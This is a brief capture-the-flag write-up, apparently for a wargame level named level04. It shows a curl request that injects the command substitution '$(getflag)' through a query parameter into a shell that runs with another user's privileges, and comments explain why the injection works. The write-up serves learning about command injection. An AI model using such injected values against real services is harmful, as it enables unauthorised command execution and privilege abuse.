#file level04 runs on a server on port 4747
#it prints the item passed to x in the query string

curl localhost:4747?x='$(getflag)'

## In this instruction : print `echo $y 2>&1`
## $y is what we send from variable x in url
## Command will be executed by privileges of flag04 so we put $(getflag) in variable x into URL
## as it would be evaluated with flag04 privileges
